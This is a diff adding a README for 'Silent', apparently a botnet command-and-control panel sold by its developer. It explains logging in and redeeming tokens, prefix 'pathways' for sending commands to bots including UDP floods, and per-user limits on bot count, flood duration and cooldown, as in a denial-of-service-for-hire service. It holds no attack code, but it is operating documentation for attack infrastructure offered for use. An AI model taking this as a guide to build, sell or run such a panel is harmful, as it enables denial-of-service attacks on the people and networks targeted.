@@ -1,0 +1,50 @@
+Silent vI (v1.0) - silence is louder than the scream.
+
+
+Upon connection to your server, the terminal will remain black. Simply type "login" and press enter. You will be sent to the login screen.
+If you have a token to redeem, instead of typing "login" You will type "register [token]" Ex: register SILENT-SKIMA
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+The Silent C2 Bot's Unique Functionalities:
+
+still in development
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+Pathways: - concept idea for now
+
+Silent runs different Pathways for different Commands. Most sources send everything anyone types on the bot socket. Meaning you could 
+connect to the bot port through Putty and sit there, and see everything anyone types. That's not secure at all.
+
+With Silent, each input must be prefaced with a Pathway Trigger (Except for the Help Commands)
+Triggers are: < for Chat | * for bots | . for ServerSide
+To input through the Chat Pathway [<] - Ex: < Sup Fuckers
+To input through the Bot Pathway [.] - Ex: * . UDP etc
+To input through the SS Pathway [.] for tools etc - Ex: ".iplookup 8.8.8.8" | All Admin Commands, Tools and Features run on this Path
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+New Account Stats:
+
+Accounts now have a Max Bot Control, Max Flood Time, and a Cooldown.
+When you add a user you'll be prompted for each of these. You can choose between 1 and 999999. To make a stat unlimited, use -1.
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+Chat:
+Upon connection, the chat will accessable with ".chat" users who are in the chat will be able to send and recieve messages from other 
+users who are in the chat. to leave the chat type ".exit"
+
+We also will be working on a direct message feature in the near future.
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+ADMINS: 
+
+Admins have their own set of administrative commmands.
+The "Adduser" command will create a new account "RemoveUser" will remove them.
+When creating a new account you will then see preset for setting account stats for that created user, Such as ID, Key, Cooldown etc.
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+IP Lookup reaches out through an API to grab address info. If for some reason you recompile your bot, or clear html, you'll need to 
+reload the php file to your server. If you bought a build or lifetime builds from me, just shoot me a message and I'll reload it for you.
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+*Disclaimers* This was not a modifyied version of another developer's source. Silent is completely from scratch. but code was reused
+from our previous projects and then modified & enhanced
